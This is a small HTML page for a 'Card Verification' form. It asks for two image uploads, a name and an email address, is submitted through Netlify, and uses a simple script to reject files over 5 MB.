<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Card Verification</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        h1 {
            margin-bottom: 20px;
            text-align: center;
        }
        form {
            display: flex;
            flex-direction: column;
        }
        label {
            margin-bottom: 10px;
        }
        input[type="file"] {
            margin-bottom: 20px;
        }
        button {
            padding: 10px;
            background-color: #007BFF;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Card Verification</h1>
        <form id="uploadForm" name="card-verification" method="post" enctype="multipart/form-data" netlify>
            <label for="file1">Upload Image 1:</label>
            <input type="file" id="file1" name="file1" accept="image/*" required>
            
            <label for="file2">Upload Image 2:</label>
            <input type="file" id="file2" name="file2" accept="image/*" required>
            
            <p>
                <label>Name <input type="text" name="name" required /></label>
            </p>
            <p>
                <label>Email <input type="email" name="email" required /></label>
            </p>
            
            <button type="submit">Submit</button>
        </form>
    </div>

    <script>
        document.getElementById('uploadForm').addEventListener('submit', function(event) {
            const file1 = document.getElementById('file1').files[0];
            const file2 = document.getElementById('file2').files[0];

            if (file1.size > 5 * 1024 * 1024 || file2.size > 5 * 1024 * 1024) {
                event.preventDefault();
                alert('Files must be smaller than 5 MB');
                // Implement file compression here if needed
            }
        });
    </script>
</body>
</html>
